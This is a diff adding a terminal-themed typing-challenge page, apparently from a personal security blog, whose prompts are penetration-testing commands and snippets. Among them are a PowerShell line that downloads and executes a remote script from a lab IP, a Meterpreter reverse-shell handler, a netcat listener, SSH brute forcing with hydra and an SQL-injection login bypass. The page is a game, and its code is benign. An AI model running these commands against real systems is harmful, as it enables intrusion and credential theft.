@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Typing Challenge | bensec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90' font-family='monospace'>></text></svg>">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/features.css">
+  <link rel="stylesheet" href="css/features-2.css">
+  <link rel="stylesheet" href="css/features-3.css">
+  <link rel="stylesheet" href="css/features-4.css">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="theme-color" content="#00ff8c">
+  <meta name="description" content="Terminal-themed typing speed challenge using real hacking commands and writeup excerpts.">
+</head>
+<body>
+  <a href="#main" class="skip-link">Skip to content</a>
+  <canvas id="matrix-bg"></canvas>
+  <div class="scanlines"></div>
+
+  <header>
+    <nav>
+      <a href="index.html" class="logo-link">
+        <span class="site-logo">Ben <span class="logo-last">Hawarden</span></span>
+      </a>
+      <ul class="nav-links">
+        <li><a href="blog.html">blog</a></li>
+        <li><a href="resources.html">resources</a></li>
+        <li><a href="cheatsheets.html">cheatsheets</a></li>
+        <li><a href="index.html#projects">projects</a></li>
+        <li><a href="now.html">achievements</a></li>
+      </ul>
+      <div class="mobile-controls">
+        <button class="theme-toggle" aria-label="Toggle theme" title="Toggle theme">◑</button>
+        <button class="mobile-menu-btn" aria-label="Toggle menu">&#9776;</button>
+      </div>
+    </nav>
+  </header>
+
+  <main id="main" class="typing-page">
+    <div class="typing-header">
+      <p class="section-label">// typing challenge</p>
+      <h1>How fast do you hack?</h1>
+      <p>Type the commands below as fast and accurately as you can.</p>
+    </div>
+
+    <div class="typing-arena" id="typing-arena">
+      <div class="typing-stats-bar">
+        <div class="typing-stat"><span class="typing-stat-val" id="t-wpm">0</span><span class="typing-stat-label">wpm</span></div>
+        <div class="typing-stat"><span class="typing-stat-val" id="t-acc">100</span><span class="typing-stat-label">% acc</span></div>
+        <div class="typing-stat"><span class="typing-stat-val" id="t-time">30</span><span class="typing-stat-label">sec</span></div>
+        <div class="typing-stat"><span class="typing-stat-val" id="t-streak">0</span><span class="typing-stat-label">streak</span></div>
+      </div>
+
+      <div class="typing-mode-bar">
+        <button class="typing-mode-btn active" data-mode="commands">commands</button>
+        <button class="typing-mode-btn" data-mode="quotes">hacking wisdom</button>
+        <button class="typing-mode-btn" data-mode="code">code snippets</button>
+        <select class="typing-time-sel" id="typing-time-sel">
+          <option value="15">15s</option>
+          <option value="30" selected>30s</option>
+          <option value="60">60s</option>
+          <option value="120">120s</option>
+        </select>
+      </div>
+
+      <div class="typing-prompt" id="typing-prompt" aria-live="polite"></div>
+
+      <div class="typing-input-wrap">
+        <span class="typing-input-prompt">$&nbsp;</span>
+        <input id="typing-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="start typing to begin…" aria-label="Type the text above">
+      </div>
+
+      <div class="typing-progress-bar"><div id="typing-progress-fill" class="typing-progress-fill"></div></div>
+
+      <div id="typing-results" class="typing-results hidden">
+        <h2 class="typing-result-title">// results</h2>
+        <div class="typing-result-stats">
+          <div class="typing-result-stat"><span class="typing-result-n" id="r-wpm">0</span><span>wpm</span></div>
+          <div class="typing-result-stat"><span class="typing-result-n" id="r-acc">0</span><span>% accuracy</span></div>
+          <div class="typing-result-stat"><span class="typing-result-n" id="r-chars">0</span><span>chars</span></div>
+          <div class="typing-result-stat"><span class="typing-result-n" id="r-errors">0</span><span>errors</span></div>
+        </div>
+        <div id="typing-rank" class="typing-rank"></div>
+        <button class="admin-btn success" id="typing-retry">retry</button>
+        <button class="admin-btn" id="typing-new">new text</button>
+      </div>
+    </div>
+
+    <div class="typing-tip">
+      <p class="dim">Tip: Press <kbd>Tab</kbd> to restart with the same text · <kbd>Enter</kbd> to get a new prompt.</p>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>&copy; 2026 Ben Hawarden</p>
+      <div class="footer-links">
+        <a href="https://github.com/Ben-Hawarden" target="_blank" rel="noopener">github</a>
+        <a href="index.html">home</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="js/script.js"></script>
+  <script src="js/fun-extras.js"></script>
+  <script src="js/site-analytics.js"></script>
+  <script>
+  (function () {
+    var PROMPTS = {
+      commands: [
+        'nmap -sC -sV -oN nmap.txt 10.10.10.1',
+        'gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt',
+        'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1',
+        'sqlmap -u "http://10.10.10.1/login.php" --dbs --batch',
+        'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
+        'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt',
+        'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run"',
+        'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+        'find / -perm -4000 -type f 2>/dev/null',
+        'sudo -l && cat /etc/passwd | grep -v nologin',
+        'curl -s http://10.10.10.1/robots.txt | grep -i disallow',
+        'wfuzz -c -w wordlist.txt -u http://10.10.10.1/FUZZ --hc 404',
+        'nc -lvnp 4444',
+        'ssh -i id_rsa user@10.10.10.1 -o StrictHostKeyChecking=no',
+        'linpeas.sh | tee linpeas.out',
+      ],
+      quotes: [
+        'The quieter you become, the more you can hear.',
+        'Hackers are not criminals. Hackers are explorers.',
+        'With great power comes great responsibility — and great attack surface.',
+        'Security through obscurity is not security at all.',
+        'The best defense is knowing how to attack.',
+        'Every system is only as secure as its weakest link.',
+        'Enumeration is the key to any successful penetration test.',
+        'Think like an attacker to defend like a champion.',
+        'If you are not pentesting your own systems, someone else is.',
+        'The goal is not to break systems — it is to understand them.',
+      ],
+      code: [
+        'for port in $(cat open_ports.txt); do nmap -sV -p $port $TARGET; done',
+        'python3 exploit.py --target 10.10.10.1 --lhost 10.10.14.1 --lport 4444',
+        '#!/bin/bash\nfor i in $(seq 1 254); do ping -c 1 192.168.1.$i | grep "bytes from"; done',
+        'import requests\nfor payload in payloads:\n    r = requests.get(url + payload)\n    if "root" in r.text:\n        print("Found:", payload)',
+        'SELECT * FROM users WHERE username=\'admin\'-- AND password=\'anything\'',
+        'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.14.1/shell.ps1\')"',
+      ]
+    };
+
+    var mode = 'commands';
+    var timeLimit = 30;
+    var currentText = '';
+    var timer = null;
+    var timeLeft = 30;
+    var started = false;
+    var totalTyped = 0;
+    var errors = 0;
+    var streak = 0;
+
+    var promptEl = document.getElementById('typing-prompt');
+    var inputEl = document.getElementById('typing-input');
+    var wpmEl = document.getElementById('t-wpm');
+    var accEl = document.getElementById('t-acc');
+    var timeEl = document.getElementById('t-time');
+    var streakEl = document.getElementById('t-streak');
+    var resultEl = document.getElementById('typing-results');
+    var progressFill = document.getElementById('typing-progress-fill');
+
+    function pickText() {
+      var arr = PROMPTS[mode] || PROMPTS.commands;
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function renderPrompt(typed) {
+      if (!promptEl) return;
+      var html = '';
+      for (var i = 0; i < currentText.length; i++) {
+        var ch = currentText[i];
+        if (i < typed.length) {
+          if (typed[i] === ch) {
+            html += '<span class="t-correct">' + escH(ch) + '</span>';
+          } else {
+            html += '<span class="t-wrong">' + escH(ch) + '</span>';
+          }
+        } else if (i === typed.length) {
+          html += '<span class="t-cursor">' + escH(ch) + '</span>';
+        } else {
+          html += '<span class="t-pending">' + escH(ch) + '</span>';
+        }
+      }
+      promptEl.innerHTML = html;
+    }
+
+    function reset(newText) {
+      clearInterval(timer);
+      started = false;
+      timeLeft = timeLimit;
+      totalTyped = 0;
+      errors = 0;
+      streak = 0;
+      currentText = newText || pickText();
+      inputEl.value = '';
+      inputEl.disabled = false;
+      wpmEl.textContent = '0';
+      accEl.textContent = '100';
+      timeEl.textContent = timeLeft;
+      streakEl.textContent = '0';
+      progressFill.style.width = '0%';
+      resultEl.classList.add('hidden');
+      renderPrompt('');
+    }
+
+    function start() {
+      if (started) return;
+      started = true;
+      var startTime = Date.now();
+      timer = setInterval(function () {
+        timeLeft--;
+        timeEl.textContent = timeLeft;
+        progressFill.style.width = ((timeLimit - timeLeft) / timeLimit * 100) + '%';
+        var elapsed = (Date.now() - startTime) / 60000;
+        var words = totalTyped / 5;
+        wpmEl.textContent = Math.round(words / elapsed) || 0;
+        if (timeLeft <= 0) finish(startTime);
+      }, 1000);
+    }
+
+    function finish(startTime) {
+      clearInterval(timer);
+      inputEl.disabled = true;
+      var elapsed = (Date.now() - startTime) / 60000;
+      var wpm = Math.round((totalTyped / 5) / elapsed) || 0;
+      var acc = totalTyped > 0 ? Math.round(((totalTyped - errors) / totalTyped) * 100) : 100;
+      document.getElementById('r-wpm').textContent = wpm;
+      document.getElementById('r-acc').textContent = acc;
+      document.getElementById('r-chars').textContent = totalTyped;
+      document.getElementById('r-errors').textContent = errors;
+      var rank = wpm >= 100 ? '🔥 Elite hacker' : wpm >= 70 ? '⚡ Fast typer' : wpm >= 50 ? '👍 Good pace' : wpm >= 30 ? '📝 Keep practising' : '🐢 Hunt and peck';
+      document.getElementById('typing-rank').textContent = rank;
+      resultEl.classList.remove('hidden');
+    }
+
+    inputEl.addEventListener('input', function () {
+      var typed = inputEl.value;
+      if (!started && typed.length > 0) start();
+      renderPrompt(typed);
+      totalTyped = Math.max(totalTyped, typed.length);
+      // Count errors as mismatched chars
+      var errs = 0;
+      for (var i = 0; i < typed.length; i++) {
+        if (typed[i] !== currentText[i]) errs++;
+      }
+      errors = errs;
+      var acc = totalTyped > 0 ? Math.round(((totalTyped - errors) / totalTyped) * 100) : 100;
+      accEl.textContent = Math.max(0, acc);
+      streak = errs === 0 ? typed.length : 0;
+      streakEl.textContent = streak;
+      // Auto-advance when complete
+      if (typed === currentText) {
+        setTimeout(function () {
+          var next = pickText();
+          currentText = next;
+          inputEl.value = '';
+          renderPrompt('');
+        }, 200);
+      }
+    });
+
+    inputEl.addEventListener('keydown', function (e) {
+      if (e.key === 'Tab') { e.preventDefault(); reset(currentText); }
+      if (e.key === 'Enter' && !started) { e.preventDefault(); reset(); }
+    });
+
+    document.getElementById('typing-retry') && document.getElementById('typing-retry').addEventListener('click', function () { reset(currentText); });
+    document.getElementById('typing-new') && document.getElementById('typing-new').addEventListener('click', function () { reset(); });
+
+    document.querySelectorAll('.typing-mode-btn').forEach(function (b) {
+      b.addEventListener('click', function () {
+        document.querySelectorAll('.typing-mode-btn').forEach(function (x) { x.classList.remove('active'); });
+        b.classList.add('active');
+        mode = b.dataset.mode;
+        reset();
+      });
+    });
+
+    var timeSel = document.getElementById('typing-time-sel');
+    if (timeSel) timeSel.addEventListener('change', function () { timeLimit = parseInt(timeSel.value, 10); reset(); });
+
+    function escH(s) {
+      return String(s).replace(/[&<>"']/g, function (c) {
+        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+      });
+    }
+
+    reset();
+  }());
+  </script>
+</body>
+</html>
